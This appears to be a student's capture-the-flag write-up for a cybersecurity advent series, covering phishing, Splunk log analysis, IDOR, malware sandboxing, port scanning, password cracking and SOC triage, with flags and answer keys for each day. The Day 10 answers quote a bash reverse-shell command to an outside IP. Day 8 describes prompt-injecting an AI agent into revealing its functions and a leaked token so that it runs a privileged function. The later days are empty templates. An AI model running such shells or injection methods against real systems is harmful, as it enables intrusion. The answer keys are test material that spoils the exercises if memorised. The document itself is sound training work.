Day-0
Advent of cyber prep trek

# 1. password pandemonium
## Solution:
- i typed in a random password that suits all the conditions and obtained the flag

## Flag:
```
THM{StrongStart}
```

# 2. suspicious chocolate 
## Solution:
- even though 99 results are safe i malicious resut also leads to an unsafe file
## Flag:
```
THM{NotSoSweet}
```

# 3. welcome to the attachbox 
## Solution:
- learnt using ls and cd
## Flag:
```
THM{Ready2Hack}
```

# 4. cmd conundrum
## Solution:
- used the /a command to reveal the hidden files
## Flag:
```
THM{WhereIsMcSkidy}
```

# 5. linux lore
## Solution:
- using linux commands like cat
## Flag:
```
THM{TrustNoBunny}
```

# 6. leak in the list
## Solution:
- i typed in the email id and clicked on the compromised domain to obtain the flag
## Flag:
```
THM{LeakedAndFound}
```

# 7. wifi woes in wareville
## Solution:
- i created a password for thw wifi router and obtained the flag
## Flag:
```
THM{NoMoreDefault}
```

# 8. the app trap
## Solution:
- opened the third party app and revoked all permissions
## Flag:
```
THM{AppTrapped}
```

# 9. chatbot confession
## Solution:
- selected all the chatbot outpust which contains sensitive info
## Flag:
```
THM{DontFeedTheBot}
```

# 10. bunny's browser trail
## Solution:
- selected the browser which isnt the commone one like google, mozialla etc.
## Flag:
```
THM{EastmasIsComing}
```


Day-1
Linux CLI - shell bells

# 1. linux cli
## Solution:
- obtained the first flag using cat and ls in guides directory
- used grep, find and ls -a o find the next flag
- logged in as a sudo user and obtained the third flag
## Flag:
```
- THM{learning-linux-cli}
- THM{sir-carrotbane-attacks}
- THM{until-we-meet-again}
```


Day-2
Phishing

# 1. phishing for tbfc
- we have to manipulate user to make a mistake and obtain the password.
## Solution:
- first we run the script so it listens to credentials.
- now we send an email to target user using SET which is designed for social engineering attacks which has many features. we configure the details of the email to be sent including a link so that target falls for the trick so yes when we open the terminal where the server is running the target user falls for the trape and 3 set of credentials are recieved
- for the next part we run the ip address and try to access using admin as factory and use the previosu password to obtain the answer.
## Flag:
```
pass: unranked-wisdom-anthem
ans: 1984000
```


Day-3
splunk basics

# 1. log analysis with spunk

## Solution:
```
Search query: index=main
```
- this query all time gives us all the ingested logs

```
Search query: index=main sourcetype=web_traffic | timechart span=1d count
```
- this query gives us traffic on web of total logs for each day and there was a spike for 6 specfific days out of which 12th ocotber 2025 (2)* was the highest
- then we go to the user agent field which tells us what software initiated the web request

```
Search query: index=main sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox*
```
- searches fir traffic on non standard browser and all of them are from the same ip address (1)*

```
Search query: sourcetype=web_traffic client_ip="<REDACTED>" AND path="*..\/..\/*" OR path="*redirect*" | stats count by path
```
- this tells us what path the hacker used which checks for vulnerabilities so gain access of unauthurized files on the website

```
Search query: sourcetype=web_traffic client_ip="<REDACTED>" AND user_agent IN ("*sqlmap*", "*Havij*") | table _time, path, status
```
- the results confirms the use of known SQL injection and attacks like SLEEP(5). A 504 code confirms a successful time-based SQL injection attack. (3)* (4)*

```
Search query: sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason
```
- now we switch to firewall and use our comprimised ip and the output gives us allowed which confirms succesful connection

```
Search Query: sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<REDACTED>" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip
```
- This gives the number of bytes transfered (5)*
## Flag:
```
- 198.51.100.55 (1)*
- 2025-10-12 (2)*
- 993 (3)*
- 658 (4)*
- 126167 (5)8
```
## Concepts learnt:
- Identity found: The attacker was identified via the highest volume of malicious web traffic originating from the external IP.
- Intrusion vector: The attack followed a clear progression in the web logs (sourcetype=web_traffic).
- Reconnaissance: Probes were initiated via cURL/Wget, looking for configuration files (/.env) and testing path traversal vulnerabilities.
- Exploitation: The use of SQLmap user agents and specific payloads (SLEEP(5)) confirmed the successful exploitation phase.
- Payload delivery: The Action on Objective was established by the final successful execution of the command cmd=./bunnylock.bin via the webshell.
- C2 confirmation: The pivot to the firewall logs (sourcetype=firewall_logs) proved the post-exploitation activity. The internal, compromised server (SRC_IP: 10.10.1.5) established an outbound C2 connection to the attacker's IP.


Day-4
Ai in security

# 1. Ai for cyber security showcase 
## Solution:
- this was more of to understand how ai will help us in cyber security
- ai is good in running large amounts of data, performing behaviour analytics, and can generate alerts as it is good at analysing behaviour and good at summarazing data.
- first we tell ai we are ready to begin and it gives us a vulnerabilty sql injection to bypass login and generates a script to compromise it so it gives a code and ask us to copy and paste it and run it from the terminal and we fill in the required ip address
- so the script works and we recieved the succesful web output which gives us the flag.
- Then we complete blue team to analyse llogs for the performed attack so it detects the log and then ai analysises source code which identifies the vulnerabilty and we get the final flag after we conclude our activity
## Flag:
```
- THM{AI_MANIA}
- THM{SQLI_EXPLOIT}
```


Day-5
IDOR

# 1. IDOR on the shelf (insecure direct object reference)
## Solution:
- Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.
- so first i type in the given credentials and play around a little to find out that my user-id is 10 and from then on i perform the various objectives to figure our how the idor vulnerability can be exploited
- then i move on to learn about horizontal and vertical privilege escalation and further play around with the user id from the inspect tool to answer the final question


Day-6
Malware analysis

# 1. Malware analysis using sandboxes
## Solution:
- Malware analysis is the process of examining a malicious file to understand its functionality, operation, and methods for defence against it. 
- we use static analysis which can be quick and effective way to understand how sample may operate.
- first we open pestudio and load the excutable and look for the sha256 a unique identifier for the excutable
- then we move on with strings of the excutable where we found a flag
- no we do the dynamic analysis where we excute the malicious sample using regshot where it takes snapshot before and after running and compares them. Then we investigate the interaction with windows os there we find the last two information about the path of the key that has been modified and we figured the network protocol used for tcp operations
## Flag:
```
- F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33
- THM{STRINGS_FOUND}
- HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\
- http
```


Day-7
Network discovery

# 1. discover network services
## Solution:
- we are given the target machine name and ip and first we shall scan for ports so we type nmap and the ip address of target so we can open ither by ssh or http
- now we add the -p- argument to scann all ports and --script=banner to see whats behind the port. we log in with an anonymous name on the ftp server and get key 1
- now we move to port 25251 using netcat command and type HELP and use GET key command and obtain the second key
- now we switch to udp ports using nmap and ip and specifying -sU and now use the dig command which performs advance dns queries and obtain the 3rd key
- now we login to the secret admin terminal and list the listening ports and we can see the services we scanned
- 3306 port is for mysql database and upon running the command it shows one table with flag. Then we run an sql query which selects all of the data from the table and thats how we obtain the final flag

## Flag:
```
- Pwned by HopSec
- 3aster_
- 15_th3_
- n3w_xm45
- 3306
- THM{4ll_s3rvice5_d1sc0vered}
```


Day-8
Prompt injection

# 1. Agentic Ai hack
- Large language models are the basis of many current AI systems. They are trained on massive collections of text and code, which allows them to produce human-like answers, summaries, and even generate programs or stories.
- LLMs have restrictions that prevent them from going beyond their built-in abilities, which limits them. They cannot act outside their text box, and their training only lasts up to a certain point in time. Because of this, they may invent facts, miss recent events, or fail at tasks that require real-world actions.
## Solution:
-  the 25th in the calender has been set to easter instead of christmas so first we tell the ai to change that and it gives a base 64 endcoded json output and then we click on the thinking which shows the breach or instructions which explains the funcion reset holiday so then li ask it to list the all available functions that are being used so we need reset holiday function.
- we tell it to excute reset holiday and needs parameters. Now we run get logs function since we the need the token so a leaked token poped up and it might be the token. Now once we run it it tells us that in the backend the name is stored as sochmas so we change the name and type out the same prompt anf hence we get the edited webpage with 25th edited to christams
## Flag:
```
- THM{XMAS_IS_COMING__BACK}
```


Day-9
Passwords

# 1. Attack against encrypted files
- dictionary attack uses predefined set of list of potential passwords.
- mask attacks or brute-force attack systematically tries every possible combination of characters until it finds the right one
## Solution:
- first use file command and confirm the file format of the files on the desktop and accordingly pick tools
- now we use pdfcrack tool which uses the pdf and wordlist to obtain the password the pdf file
- for the zip file we use ```zip2john``` which extracts contents of the zip to another file which we name and then attach the wordlist so that we obtain the password of the zip file
## Flag:
```
- THM{Cr4ck1ng_PDFs_1s_34$y}
- THM{Cr4ck1n6_z1p$_1s_34$yyyy}
```


Day-10
Soc alert triaging

# 1. Investigation and logs
## Solution:
- we first set up our enivironment and when an alert pops up we investigate which consists of multiple levels so we navigate to microsoft sentinel and based on the questiosn and answers required we individually investigate
- first we investiagte superfically on top and obtain the first three answers and next we ive deeper in to logs and anylse queries and much more to obtain the rest of the answers
## Flag:
```
- 10
- High
- 4
- malicious_mod.ko
- /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
- 172.16.0.12
- 203.0.113.45
- deploy
```


Day-11

# 1. 

## Solution:

## Flag:
```

```


Day-12

# 1. 

## Solution:

## Flag:
```

```


Day-13

# 1. 

## Solution:

## Flag:
```

```


Day-14

# 1. 

## Solution:

## Flag:
```

```


Day-15

# 1. 

## Solution:

## Flag:
```

```


Day-16

# 1. 

## Solution:

## Flag:
```

```


Day-17

# 1. 

## Solution:

## Flag:
```

```


Day-18

# 1. 

## Solution:

## Flag:
```

```


Day-19

# 1. 

## Solution:

## Flag:
```

```


Day-20

# 1. 

## Solution:

## Flag:
```

```


Day-21

# 1. 

## Solution:

## Flag:
```

```


Day-22

# 1. 

## Solution:

## Flag:
```

```


Day-23

# 1. 

## Solution:

## Flag:
```

```


Day-24

# 1. 

## Solution:

## Flag:
```

```


Day-25

# 1. 

## Solution:

## Flag:
```

```

